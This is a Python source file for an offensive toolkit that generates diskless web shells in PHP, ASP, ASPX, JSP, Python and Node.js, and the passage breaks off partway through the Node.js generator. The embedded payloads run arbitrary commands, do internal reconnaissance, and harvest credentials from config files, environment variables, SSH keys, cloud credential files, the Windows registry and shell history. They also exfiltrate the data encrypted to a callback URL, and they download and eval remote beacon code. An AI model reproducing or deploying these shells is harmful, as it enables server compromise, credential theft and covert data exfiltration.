"""
Web Shell & Post-Web Exploitation Enhancer
Advanced diskless webshell with auto-upgrade and post-exploitation capabilities

Author: ITherso
Version: 1.0.0
"""

import os
import re
import json
import base64
import hashlib
import secrets
import time
import threading
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from abc import ABC, abstractmethod
import urllib.parse
import struct
import zlib


class WebShellType(Enum):
    """Supported web shell types"""
    PHP = "php"
    ASP = "asp"
    ASPX = "aspx"
    JSP = "jsp"
    PYTHON = "python"
    NODE = "node"


class MemoryTechnique(Enum):
    """Memory-only execution techniques"""
    EVAL_STREAM = "eval_stream"
    REFLECTION = "reflection"
    DYNAMIC_COMPILE = "dynamic_compile"
    OPCACHE_POISON = "opcache_poison"
    JIT_SPRAY = "jit_spray"


class ExfilMethod(Enum):
    """Data exfiltration methods"""
    DNS_TUNNEL = "dns_tunnel"
    HTTP_CHUNKED = "http_chunked"
    ICMP_COVERT = "icmp_covert"
    WEBSOCKET = "websocket"
    STEGANOGRAPHY = "steganography"


@dataclass
class WebShellConfig:
    """Web shell configuration"""
    shell_type: WebShellType
    memory_only: bool = True
    auto_upgrade: bool = True
    encryption_key: str = ""
    callback_url: str = ""
    exfil_method: ExfilMethod = ExfilMethod.HTTP_CHUNKED
    chunk_size: int = 4096
    jitter_min: int = 1
    jitter_max: int = 5
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


@dataclass 
class ReconResult:
    """Internal reconnaissance result"""
    hostname: str = ""
    ip_addresses: List[str] = field(default_factory=list)
    arp_table: List[Dict] = field(default_factory=list)
    netstat: List[Dict] = field(default_factory=list)
    processes: List[Dict] = field(default_factory=list)
    users: List[str] = field(default_factory=list)
    env_vars: Dict[str, str] = field(default_factory=dict)
    web_config: Dict[str, Any] = field(default_factory=dict)
    db_connections: List[Dict] = field(default_factory=list)
    timestamp: str = ""


@dataclass
class HarvestedCredential:
    """Harvested credential"""
    source: str
    username: str
    credential: str
    credential_type: str  # password, hash, token, key
    timestamp: str
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ExfilChunk:
    """Data exfiltration chunk"""
    chunk_id: int
    total_chunks: int
    data: bytes
    checksum: str
    encrypted: bool = True
    timestamp: str = ""


class EncryptionEngine:
    """Encryption engine for secure communication"""
    
    def __init__(self, key: str = ""):
        self.key = key or secrets.token_hex(32)
        self._derive_keys()
    
    def _derive_keys(self):
        """Derive encryption keys"""
        key_bytes = self.key.encode()
        self.aes_key = hashlib.sha256(key_bytes).digest()
        self.hmac_key = hashlib.sha256(key_bytes + b"hmac").digest()
    
    def encrypt(self, data: bytes) -> bytes:
        """Encrypt data with XOR + compression (simplified for demo)"""
        compressed = zlib.compress(data)
        key_stream = self._generate_keystream(len(compressed))
        encrypted = bytes(a ^ b for a, b in zip(compressed, key_stream))
        return base64.b64encode(encrypted)
    
    def decrypt(self, data: bytes) -> bytes:
        """Decrypt data"""
        encrypted = base64.b64decode(data)
        key_stream = self._generate_keystream(len(encrypted))
        decrypted = bytes(a ^ b for a, b in zip(encrypted, key_stream))
        return zlib.decompress(decrypted)
    
    def _generate_keystream(self, length: int) -> bytes:
        """Generate keystream for encryption"""
        keystream = b""
        counter = 0
        while len(keystream) < length:
            block = hashlib.sha256(self.aes_key + struct.pack(">I", counter)).digest()
            keystream += block
            counter += 1
        return keystream[:length]


class MemoryOnlyShellGenerator:
    """Generate memory-only web shells (diskless)"""
    
    def __init__(self, config: WebShellConfig):
        self.config = config
        self.encryption = EncryptionEngine(config.encryption_key)
    
    def generate(self) -> Dict[str, Any]:
        """Generate memory-only shell based on type"""
        generators = {
            WebShellType.PHP: self._generate_php_memory_shell,
            WebShellType.ASP: self._generate_asp_memory_shell,
            WebShellType.ASPX: self._generate_aspx_memory_shell,
            WebShellType.JSP: self._generate_jsp_memory_shell,
            WebShellType.PYTHON: self._generate_python_memory_shell,
            WebShellType.NODE: self._generate_node_memory_shell,
        }
        
        generator = generators.get(self.config.shell_type)
        if not generator:
            raise ValueError(f"Unsupported shell type: {self.config.shell_type}")
        
        return generator()
    
    def _generate_php_memory_shell(self) -> Dict[str, Any]:
        """Generate PHP memory-only shell"""
        
        # Stage 1: Minimal loader (diskless)
        loader = '''<?php
// Memory-only PHP shell - No disk writes
// Encrypted payload execution via eval stream

$k = '${KEY}';
$iv = substr(hash('sha256', $k), 0, 16);

// Fetch payload from memory stream
$p = file_get_contents('php://input');
if(empty($p)) $p = @$_REQUEST['d'];
if(empty($p)) exit;

// Decrypt and execute in memory
function d($d, $k) {
    $d = base64_decode($d);
    $r = '';
    for($i=0; $i<strlen($d); $i++) {
        $r .= $d[$i] ^ $k[$i % strlen($k)];
    }
    return gzuncompress($r);
}

// Execute without disk touch
@eval(d($p, $k));
?>'''
        
        # Stage 2: Full payload (sent encrypted)
        full_payload = '''
// Advanced Memory Shell with Post-Exploitation
class MemShell {
    private $key;
    private $callback;
    
    public function __construct($key, $callback) {
        $this->key = $key;
        $this->callback = $callback;
    }
    
    // Execute command in memory
    public function exec($cmd) {
        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        
        $proc = proc_open($cmd, $descriptors, $pipes);
        if(is_resource($proc)) {
            fclose($pipes[0]);
            $out = stream_get_contents($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            return ["out" => $out, "err" => $err];
        }
        return ["err" => "Failed to execute"];
    }
    
    // Internal recon
    public function recon() {
        $data = [];
        $data["hostname"] = gethostname();
        $data["ip"] = gethostbyname(gethostname());
        $data["user"] = get_current_user();
        $data["cwd"] = getcwd();
        $data["php_version"] = phpversion();
        $data["os"] = php_uname();
        $data["env"] = $_ENV;
        
        // Network connections
        $data["netstat"] = $this->exec("netstat -an 2>/dev/null || ss -an 2>/dev/null")["out"];
        
        // ARP table
        $data["arp"] = $this->exec("arp -a 2>/dev/null || cat /proc/net/arp 2>/dev/null")["out"];
        
        // Processes
        $data["ps"] = $this->exec("ps aux 2>/dev/null || tasklist 2>nul")["out"];
        
        return $data;
    }
    
    // Credential harvesting
    public function harvest() {
        $creds = [];
        
        // PHP session files
        $sess_path = session_save_path() ?: "/tmp";
        foreach(glob("$sess_path/sess_*") as $f) {
            $creds[] = ["source" => "php_session", "data" => @file_get_contents($f)];
        }
        
        // Web config files
        $configs = [
            "wp-config.php", "../wp-config.php",
            "configuration.php", "../configuration.php",
            "config.php", "../config.php",
            "settings.php", "../settings.php",
            ".env", "../.env"
        ];
        
        foreach($configs as $cfg) {
            if(file_exists($cfg) && is_readable($cfg)) {
                $content = @file_get_contents($cfg);
                // Extract DB credentials
                preg_match_all("/['\"]?(DB_|MYSQL_|DATABASE_)?(?:PASSWORD|PASS|PWD|USER|HOST|NAME)['\"]?\s*[=:>]\s*['\"]([^'\"]+)['\"]/i", $content, $m);
                if(!empty($m[0])) {
                    $creds[] = ["source" => $cfg, "matches" => $m[0]];
                }
            }
        }
        
        // Environment variables
        foreach($_ENV as $k => $v) {
            if(preg_match("/(pass|pwd|key|secret|token|api)/i", $k)) {
                $creds[] = ["source" => "env", "key" => $k, "value" => $v];
            }
        }
        
        return $creds;
    }
    
    // Encrypted exfiltration
    public function exfil($data, $method = "http") {
        $encrypted = $this->encrypt(json_encode($data));
        $chunks = str_split($encrypted, 4096);
        
        foreach($chunks as $i => $chunk) {
            $payload = [
                "id" => $i,
                "total" => count($chunks),
                "data" => base64_encode($chunk),
                "ts" => time()
            ];
            
            // Send chunk
            $this->send_chunk($payload, $method);
            usleep(rand(100000, 500000)); // Jitter
        }
        
        return ["chunks_sent" => count($chunks)];
    }
    
    private function encrypt($data) {
        $compressed = gzcompress($data);
        $encrypted = "";
        for($i = 0; $i < strlen($compressed); $i++) {
            $encrypted .= $compressed[$i] ^ $this->key[$i % strlen($this->key)];
        }
        return base64_encode($encrypted);
    }
    
    private function send_chunk($payload, $method) {
        $opts = [
            "http" => [
                "method" => "POST",
                "header" => "Content-Type: application/json\\r\\n",
                "content" => json_encode($payload),
                "timeout" => 10
            ]
        ];
        $ctx = stream_context_create($opts);
        @file_get_contents($this->callback, false, $ctx);
    }
    
    // Auto-upgrade to beacon
    public function upgrade_to_beacon() {
        $beacon_code = $this->fetch_beacon();
        if($beacon_code) {
            // Execute beacon in memory
            @eval($beacon_code);
            return ["status" => "upgraded"];
        }
        return ["status" => "failed"];
    }
    
    private function fetch_beacon() {
        $opts = [
            "http" => [
                "method" => "GET",
                "header" => "User-Agent: Mozilla/5.0\\r\\n",
                "timeout" => 30
            ]
        ];
        $ctx = stream_context_create($opts);
        return @file_get_contents($this->callback . "/beacon", false, $ctx);
    }
}

// Initialize and handle request
$shell = new MemShell("${KEY}", "${CALLBACK}");
$action = @$_REQUEST["a"] ?: "exec";
$param = @$_REQUEST["p"] ?: "";

switch($action) {
    case "exec":
        echo json_encode($shell->exec($param));
        break;
    case "recon":
        echo json_encode($shell->recon());
        break;
    case "harvest":
        echo json_encode($shell->harvest());
        break;
    case "exfil":
        echo json_encode($shell->exfil(json_decode($param, true)));
        break;
    case "upgrade":
        echo json_encode($shell->upgrade_to_beacon());
        break;
    default:
        echo json_encode(["error" => "unknown action"]);
}
'''
        
        key = self.config.encryption_key or secrets.token_hex(16)
        
        return {
            "type": "php",
            "memory_only": True,
            "loader": loader.replace("${KEY}", key),
            "payload": full_payload.replace("${KEY}", key).replace("${CALLBACK}", self.config.callback_url),
            "key": key,
            "usage": {
                "exec": "?a=exec&p=whoami",
                "recon": "?a=recon",
                "harvest": "?a=harvest",
                "upgrade": "?a=upgrade"
            }
        }
    
    def _generate_asp_memory_shell(self) -> Dict[str, Any]:
        """Generate ASP/VBScript memory-only shell"""
        
        loader = '''<%@ Language=VBScript %>
<%
' Memory-only ASP shell
' No file writes, eval-based execution

Dim k, d, p
k = "${KEY}"

' Get encrypted payload
d = Request.Form("d")
If d = "" Then d = Request.QueryString("d")
If d = "" Then Response.End

' Decrypt
Function Dec(s, key)
    Dim i, r, c
    s = Base64Dec(s)
    r = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1)) Xor Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1))
        r = r & Chr(c)
    Next
    Dec = r
End Function

Function Base64Dec(s)
    Dim xml, elem
    Set xml = Server.CreateObject("MSXML2.DOMDocument")
    Set elem = xml.CreateElement("tmp")
    elem.DataType = "bin.base64"
    elem.Text = s
    Base64Dec = elem.NodeTypedValue
    Set elem = Nothing
    Set xml = Nothing
End Function

' Execute in memory
Execute Dec(d, k)
%>'''
        
        full_payload = '''
' Advanced ASP Memory Shell
Class MemShell
    Private m_key
    Private m_callback
    
    Public Sub Init(key, callback)
        m_key = key
        m_callback = callback
    End Sub
    
    ' Execute command
    Public Function Exec(cmd)
        Dim shell, exec, stdout
        Set shell = Server.CreateObject("WScript.Shell")
        Set exec = shell.Exec("cmd /c " & cmd)
        stdout = exec.StdOut.ReadAll()
        Exec = stdout
        Set exec = Nothing
        Set shell = Nothing
    End Function
    
    ' Internal recon
    Public Function Recon()
        Dim info, net, wmi, items
        Set info = Server.CreateObject("Scripting.Dictionary")
        
        info.Add "hostname", Exec("hostname")
        info.Add "ipconfig", Exec("ipconfig /all")
        info.Add "netstat", Exec("netstat -an")
        info.Add "arp", Exec("arp -a")
        info.Add "whoami", Exec("whoami /all")
        info.Add "systeminfo", Exec("systeminfo")
        
        Set Recon = info
    End Function
    
    ' Credential harvesting
    Public Function Harvest()
        Dim creds
        Set creds = Server.CreateObject("Scripting.Dictionary")
        
        ' Registry SAM (requires admin)
        creds.Add "sam", Exec("reg query HKLM\\SAM\\SAM 2>nul")
        
        ' Cached credentials
        creds.Add "cached", Exec("reg query ""HKLM\\Security\\Cache"" 2>nul")
        
        ' WiFi passwords
        creds.Add "wifi", Exec("netsh wlan show profiles 2>nul")
        
        ' Web.config
        creds.Add "webconfig", ReadFile(Server.MapPath("web.config"))
        
        Set Harvest = creds
    End Function
    
    Private Function ReadFile(path)
        On Error Resume Next
        Dim fso, f
        Set fso = Server.CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(path) Then
            Set f = fso.OpenTextFile(path, 1)
            ReadFile = f.ReadAll()
            f.Close
        Else
            ReadFile = ""
        End If
        Set fso = Nothing
    End Function
End Class

Dim shell
Set shell = New MemShell
shell.Init "${KEY}", "${CALLBACK}"

Dim action, param
action = Request("a")
param = Request("p")

Select Case action
    Case "exec"
        Response.Write shell.Exec(param)
    Case "recon"
        Dim r, k
        Set r = shell.Recon()
        For Each k In r.Keys
            Response.Write k & ":" & vbCrLf & r(k) & vbCrLf & vbCrLf
        Next
    Case "harvest"
        Set r = shell.Harvest()
        For Each k In r.Keys
            Response.Write k & ":" & vbCrLf & r(k) & vbCrLf & vbCrLf
        Next
End Select
'''
        
        key = self.config.encryption_key or secrets.token_hex(16)
        
        return {
            "type": "asp",
            "memory_only": True,
            "loader": loader.replace("${KEY}", key),
            "payload": full_payload.replace("${KEY}", key).replace("${CALLBACK}", self.config.callback_url),
            "key": key
        }
    
    def _generate_aspx_memory_shell(self) -> Dict[str, Any]:
        """Generate ASPX/.NET memory-only shell"""
        
        loader = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%
// Memory-only ASPX shell via dynamic compilation
string k = "${KEY}";
string d = Request["d"] ?? "";
if(string.IsNullOrEmpty(d)) return;

// Decrypt payload
byte[] encrypted = Convert.FromBase64String(d);
byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(k);
byte[] decrypted = new byte[encrypted.Length];
for(int i = 0; i < encrypted.Length; i++) {
    decrypted[i] = (byte)(encrypted[i] ^ keyBytes[i % keyBytes.Length]);
}

// Decompress
using(var ms = new MemoryStream(decrypted))
using(var ds = new DeflateStream(ms, CompressionMode.Decompress))
using(var sr = new StreamReader(ds)) {
    string code = sr.ReadToEnd();
    
    // Compile and execute in memory
    var provider = new Microsoft.CSharp.CSharpCodeProvider();
    var parameters = new System.CodeDom.Compiler.CompilerParameters();
    parameters.GenerateInMemory = true;
    parameters.ReferencedAssemblies.Add("System.dll");
    parameters.ReferencedAssemblies.Add("System.Web.dll");
    
    var results = provider.CompileAssemblyFromSource(parameters, code);
    if(results.Errors.Count == 0) {
        var assembly = results.CompiledAssembly;
        var type = assembly.GetType("MemShell");
        var method = type.GetMethod("Run");
        var instance = Activator.CreateInstance(type);
        method.Invoke(instance, new object[] { Context });
    }
}
%>'''
        
        full_payload = '''
using System;
using System.Web;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Collections.Generic;
using Microsoft.Win32;

public class MemShell {
    private string key;
    private string callback;
    
    public MemShell() {
        key = "${KEY}";
        callback = "${CALLBACK}";
    }
    
    public void Run(HttpContext ctx) {
        string action = ctx.Request["a"] ?? "exec";
        string param = ctx.Request["p"] ?? "";
        
        string result = "";
        switch(action) {
            case "exec":
                result = Exec(param);
                break;
            case "recon":
                result = Recon();
                break;
            case "harvest":
                result = Harvest();
                break;
            case "upgrade":
                result = UpgradeToBeacon();
                break;
        }
        
        ctx.Response.Write(result);
    }
    
    private string Exec(string cmd) {
        try {
            var psi = new ProcessStartInfo {
                FileName = "cmd.exe",
                Arguments = "/c " + cmd,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            using(var proc = Process.Start(psi)) {
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                return output + error;
            }
        } catch(Exception ex) {
            return "Error: " + ex.Message;
        }
    }
    
    private string Recon() {
        var sb = new StringBuilder();
        sb.AppendLine("=== HOSTNAME ===");
        sb.AppendLine(Environment.MachineName);
        sb.AppendLine("=== USER ===");
        sb.AppendLine(Environment.UserName);
        sb.AppendLine("=== DOMAIN ===");
        sb.AppendLine(Environment.UserDomainName);
        sb.AppendLine("=== OS ===");
        sb.AppendLine(Environment.OSVersion.ToString());
        sb.AppendLine("=== IPCONFIG ===");
        sb.AppendLine(Exec("ipconfig /all"));
        sb.AppendLine("=== NETSTAT ===");
        sb.AppendLine(Exec("netstat -an"));
        sb.AppendLine("=== ARP ===");
        sb.AppendLine(Exec("arp -a"));
        sb.AppendLine("=== PROCESSES ===");
        sb.AppendLine(Exec("tasklist /v"));
        return sb.ToString();
    }
    
    private string Harvest() {
        var sb = new StringBuilder();
        
        // Connection strings from web.config
        sb.AppendLine("=== CONNECTION STRINGS ===");
        try {
            var config = System.Web.Configuration.WebConfigurationManager.ConnectionStrings;
            foreach(System.Configuration.ConnectionStringSettings cs in config) {
                sb.AppendLine(cs.Name + ": " + cs.ConnectionString);
            }
        } catch { }
        
        // Registry credentials
        sb.AppendLine("=== REGISTRY SECRETS ===");
        string[] regPaths = {
            @"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
        };
        
        foreach(var path in regPaths) {
            try {
                using(var key = Registry.LocalMachine.OpenSubKey(path)) {
                    if(key != null) {
                        foreach(var name in key.GetValueNames()) {
                            if(name.ToLower().Contains("pass") || name.ToLower().Contains("pwd")) {
                                sb.AppendLine($"{path}\\{name}: {key.GetValue(name)}");
                            }
                        }
                    }
                }
            } catch { }
        }
        
        // Environment variables
        sb.AppendLine("=== SENSITIVE ENV VARS ===");
        foreach(System.Collections.DictionaryEntry env in Environment.GetEnvironmentVariables()) {
            string k = env.Key.ToString().ToLower();
            if(k.Contains("pass") || k.Contains("key") || k.Contains("secret") || k.Contains("token")) {
                sb.AppendLine($"{env.Key}: {env.Value}");
            }
        }
        
        return sb.ToString();
    }
    
    private string UpgradeToBeacon() {
        try {
            using(var wc = new WebClient()) {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                string beacon = wc.DownloadString(callback + "/beacon.cs");
                // Would compile and execute beacon in memory
                return "Beacon code fetched, ready for execution";
            }
        } catch(Exception ex) {
            return "Upgrade failed: " + ex.Message;
        }
    }
}
'''
        
        key = self.config.encryption_key or secrets.token_hex(16)
        
        return {
            "type": "aspx",
            "memory_only": True,
            "loader": loader.replace("${KEY}", key),
            "payload": full_payload.replace("${KEY}", key).replace("${CALLBACK}", self.config.callback_url),
            "key": key
        }
    
    def _generate_jsp_memory_shell(self) -> Dict[str, Any]:
        """Generate JSP memory-only shell"""
        
        loader = '''<%@ page import="java.io.*,java.util.*,java.lang.reflect.*" %>
<%@ page import="javax.crypto.*,javax.crypto.spec.*" %>
<%
// Memory-only JSP shell via reflection
String k = "${KEY}";
String d = request.getParameter("d");
if(d == null || d.isEmpty()) return;

// Decrypt
byte[] encrypted = Base64.getDecoder().decode(d);
byte[] keyBytes = k.getBytes("UTF-8");
byte[] decrypted = new byte[encrypted.length];
for(int i = 0; i < encrypted.length; i++) {
    decrypted[i] = (byte)(encrypted[i] ^ keyBytes[i % keyBytes.length]);
}

// Execute via scripting engine (Nashorn/GraalJS)
javax.script.ScriptEngineManager mgr = new javax.script.ScriptEngineManager();
javax.script.ScriptEngine engine = mgr.getEngineByName("JavaScript");
if(engine != null) {
    engine.put("request", request);
    engine.put("response", response);
    engine.put("out", out);
    engine.eval(new String(decrypted, "UTF-8"));
}
%>'''
        
        full_payload = '''
// Advanced JSP Memory Shell (JavaScript/Nashorn)
var Runtime = Java.type("java.lang.Runtime");
var BufferedReader = Java.type("java.io.BufferedReader");
var InputStreamReader = Java.type("java.io.InputStreamReader");
var StringBuilder = Java.type("java.lang.StringBuilder");
var InetAddress = Java.type("java.net.InetAddress");
var System = Java.type("java.lang.System");

function exec(cmd) {
    var rt = Runtime.getRuntime();
    var proc = rt.exec(cmd);
    var br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    var sb = new StringBuilder();
    var line;
    while((line = br.readLine()) != null) {
        sb.append(line).append("\\n");
    }
    return sb.toString();
}

function recon() {
    var info = {};
    info.hostname = InetAddress.getLocalHost().getHostName();
    info.ip = InetAddress.getLocalHost().getHostAddress();
    info.user = System.getProperty("user.name");
    info.os = System.getProperty("os.name") + " " + System.getProperty("os.version");
    info.java = System.getProperty("java.version");
    info.netstat = exec("netstat -an");
    info.arp = exec("arp -a");
    info.ps = exec("ps aux 2>/dev/null || tasklist 2>nul");
    return JSON.stringify(info, null, 2);
}

function harvest() {
    var creds = [];
    
    // Environment variables
    var env = System.getenv();
    for each(var key in env.keySet()) {
        if(/pass|pwd|key|secret|token/i.test(key)) {
            creds.push({source: "env", key: key, value: env.get(key)});
        }
    }
    
    // System properties
    var props = System.getProperties();
    for each(var key in props.stringPropertyNames()) {
        if(/pass|pwd|key|secret/i.test(key)) {
            creds.push({source: "sysprop", key: key, value: props.getProperty(key)});
        }
    }
    
    return JSON.stringify(creds, null, 2);
}

// Handle request
var action = request.getParameter("a") || "exec";
var param = request.getParameter("p") || "";

switch(action) {
    case "exec":
        out.print(exec(param));
        break;
    case "recon":
        out.print(recon());
        break;
    case "harvest":
        out.print(harvest());
        break;
    default:
        out.print("Unknown action");
}
'''
        
        key = self.config.encryption_key or secrets.token_hex(16)
        
        return {
            "type": "jsp",
            "memory_only": True,
            "loader": loader.replace("${KEY}", key),
            "payload": full_payload,
            "key": key
        }
    
    def _generate_python_memory_shell(self) -> Dict[str, Any]:
        """Generate Python memory-only shell (Flask/Django)"""
        
        loader = '''# Memory-only Python shell
# Inject into existing Flask/Django app or standalone
import base64, zlib, types

K = "${KEY}"

def mem_exec(encrypted_payload):
    """Execute encrypted payload in memory"""
    try:
        data = base64.b64decode(encrypted_payload)
        decrypted = bytes(d ^ ord(K[i % len(K)]) for i, d in enumerate(data))
        code = zlib.decompress(decrypted).decode()
        exec(code, globals())
    except Exception as e:
        return str(e)

# For Flask: @app.route('/api/internal', methods=['POST'])
def handler():
    from flask import request, jsonify
    d = request.form.get('d') or request.args.get('d')
    if d:
        result = mem_exec(d)
        return jsonify({"result": result})
    return jsonify({"error": "no payload"})
'''
        
        full_payload = '''
import os
import socket
import subprocess
import json
import re
import base64
import urllib.request
from pathlib import Path

class MemShell:
    def __init__(self, key, callback):
        self.key = key
        self.callback = callback
    
    def exec(self, cmd):
        """Execute command"""
        try:
            result = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=30
            )
            return {"stdout": result.stdout, "stderr": result.stderr, "code": result.returncode}
        except Exception as e:
            return {"error": str(e)}
    
    def recon(self):
        """Internal reconnaissance"""
        info = {
            "hostname": socket.gethostname(),
            "fqdn": socket.getfqdn(),
            "user": os.getenv("USER") or os.getenv("USERNAME"),
            "cwd": os.getcwd(),
            "home": str(Path.home()),
            "pid": os.getpid(),
            "env": dict(os.environ),
        }
        
        # Network info
        info["netstat"] = self.exec("netstat -an 2>/dev/null || ss -an")["stdout"]
        info["arp"] = self.exec("arp -a 2>/dev/null || cat /proc/net/arp")["stdout"]
        info["ifconfig"] = self.exec("ifconfig 2>/dev/null || ip addr")["stdout"]
        
        # Processes
        info["ps"] = self.exec("ps aux 2>/dev/null || tasklist")["stdout"]
        
        return info
    
    def harvest(self):
        """Credential harvesting"""
        creds = []
        
        # Environment variables
        for k, v in os.environ.items():
            if re.search(r"pass|pwd|key|secret|token|api", k, re.I):
                creds.append({"source": "env", "key": k, "value": v})
        
        # Config files
        config_paths = [
            ".env", "../.env",
            "config.py", "../config.py",
            "settings.py", "../settings.py",
            "local_settings.py",
            ".git/config",
            "~/.ssh/id_rsa",
            "~/.aws/credentials",
            "~/.docker/config.json"
        ]
        
        for path in config_paths:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                try:
                    with open(expanded, 'r') as f:
                        content = f.read()
                    # Extract secrets
                    matches = re.findall(
                        r'["\']?(password|secret|key|token|api_key)["\']?\s*[=:]\s*["\']([^"\']+)["\']',
                        content, re.I
                    )
                    if matches:
                        creds.append({"source": path, "matches": matches})
                except:
                    pass
        
        # History files
        history_files = [
            "~/.bash_history",
            "~/.zsh_history",
            "~/.python_history"
        ]
        
        for hf in history_files:
            expanded = os.path.expanduser(hf)
            if os.path.exists(expanded):
                try:
                    with open(expanded, 'r') as f:
                        lines = f.readlines()[-100:]  # Last 100 commands
                    for line in lines:
                        if re.search(r"pass|pwd|key|secret", line, re.I):
                            creds.append({"source": hf, "line": line.strip()})
                except:
                    pass
        
        return creds
    
    def exfil(self, data, chunk_size=4096):
        """Encrypted chunked exfiltration"""
        import zlib
        
        # Compress and encrypt
        compressed = zlib.compress(json.dumps(data).encode())
        encrypted = bytes(b ^ ord(self.key[i % len(self.key)]) for i, b in enumerate(compressed))
        encoded = base64.b64encode(encrypted).decode()
        
        # Chunk and send
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            payload = {
                "id": i,
                "total": len(chunks),
                "data": chunk,
                "ts": int(__import__('time').time())
            }
            
            try:
                req = urllib.request.Request(
                    self.callback,
                    data=json.dumps(payload).encode(),
                    headers={"Content-Type": "application/json"}
                )
                urllib.request.urlopen(req, timeout=10)
            except:
                pass
            
            __import__('time').sleep(__import__('random').uniform(0.1, 0.5))
        
        return {"chunks_sent": len(chunks)}
    
    def upgrade(self):
        """Auto-upgrade to beacon"""
        try:
            req = urllib.request.Request(
                f"{self.callback}/beacon.py",
                headers={"User-Agent": "Mozilla/5.0"}
            )
            beacon_code = urllib.request.urlopen(req, timeout=30).read().decode()
            exec(beacon_code, globals())
            return {"status": "upgraded"}
        except Exception as e:
            return {"status": "failed", "error": str(e)}

# Initialize
shell = MemShell("${KEY}", "${CALLBACK}")

# Handle based on action
action = globals().get('action', 'exec')
param = globals().get('param', '')

if action == "exec":
    result = shell.exec(param)
elif action == "recon":
    result = shell.recon()
elif action == "harvest":
    result = shell.harvest()
elif action == "exfil":
    result = shell.exfil(json.loads(param))
elif action == "upgrade":
    result = shell.upgrade()
else:
    result = {"error": "unknown action"}

print(json.dumps(result, indent=2, default=str))
'''
        
        key = self.config.encryption_key or secrets.token_hex(16)
        
        return {
            "type": "python",
            "memory_only": True,
            "loader": loader.replace("${KEY}", key),
            "payload": full_payload.replace("${KEY}", key).replace("${CALLBACK}", self.config.callback_url),
            "key": key
        }
    
    def _generate_node_memory_shell(self) -> Dict[str, Any]:
        """Generate Node.js memory-only shell"""
        
        loader = '''// Memory-only Node.js shell
const crypto = require('crypto');
const zlib = require('zlib');
const vm = require('vm');

const K = '${KEY}';

function memExec(encrypted) {
    // Decrypt
    const data = Buffer.from(encrypted, 'base64');
    const key = Buffer.from(K);
    const decrypted = Buffer.alloc(data.length);
    for(let i = 0; i < data.length; i++) {
        decrypted[i] = data[i] ^ key[i % key.length];
    }
    
    // Decompress and execute
    const code = zlib.inflateSync(decrypted).toString();
    
    // Execute in VM sandbox
    const sandbox = {
        require: require,
        console: console,
        process: process,
        Buffer: Buffer,
        __dirname: __dirname,
        exports: {}
    };
    
    vm.runInNewContext(code, sandbox);
    return sandbox.exports.result;
}

// Express middleware
module.exports = (req, res, next) => {
    if(req.query.d || req.body?.d) {
        const result = memExec(req.query.d || req.body.d);
        return res.json({ result });
    }
    next();
};
'''
        
        full_payload = '''
const { execSync, spawn } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const zlib = require('zlib');

class MemShell {
    constructor(key, callback) {
        this.key = key;
        this.callback = callback;
    }
    
    exec(cmd) {
        try {
            const result = execSync(cmd, { 
                encoding: 'utf8',
                timeout: 30000,
                maxBuffer: 50 * 1024 * 1024
            });
            return { stdout: result };
        } catch(e) {
            return { error: e.message, stderr: e.stderr };
        }
    }
    
    recon() {
        return {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            user: os.userInfo(),
            homedir: os.homedir(),
            tmpdir: os.tmpdir(),
            cpus: os.cpus().length,
            memory: {
                total: os.totalmem(),
                free: os.freemem()
            },
            network: os.networkInterfaces(),
            uptime: os.uptime(),
            cwd: process.cwd(),
            pid: process.pid,
            env: process.env,
            netstat: this.exec('netstat -an').stdout,
            arp: this.exec('arp -a').stdout,
            ps: this.exec(os.platform() === 'win32' ? 'tasklist' : 'ps aux').stdout
        };
    }
    
    harvest() {
        const creds = [];
        
        // Environment variables
        for(const [k, v] of Object.entries(process.env)) {
            if(/pass|pwd|key|secret|token|api/i.test(k)) {
                creds.push({ source: 'env', key: k, value: v });
            }
        }
        
        // Config files
        const configFiles = [
            '.env', '../.env',
            'config.json', '../config.json',
            'package.json',
            '.npmrc',
            path.join(os.homedir(), '.npmrc'),
            path.join(os.homedir(), '.aws/credentials'),
            path.join(os.homedir(), '.docker/config.json')
        ];
        
        for(const file of configFiles) {
            try {
                if(fs.existsSync(file)) {
                    const content = fs.readFileSync(file, 'utf8');
                    const matches = content.match(/["']?(password|secret|key|token|api[_-]?key)["']?\s*[=:]\s*["']([^"']+)["']/gi);
                    if(matches) {
                        creds.push({ source: file, matches });
                    }
                }
            } catch(e) {}
        }
        
        // SSH keys
        const sshDir = path.join(os.homedir(), '.ssh');
        if(fs.existsSync(sshDir)) {
            try {
                const files = fs.readdirSync(sshDir);
                for(const f of files) {
                    if(!f.endsWith('.pub')) {
                        try {
                            const content = fs.readFileSync(path.join(sshDir, f), 'utf8');
                            if(content.includes('PRIVATE KEY')) {
                                creds.push({ source: `~/.ssh/${f}`, type: 'ssh_key', exists: true });
                            }
                        } catch(e) {}
                    }
                }
            } catch(e) {}
        }
        
        return creds;
    }
    
    async exfil(data, chunkSize = 4096) {
        // Compress and encrypt
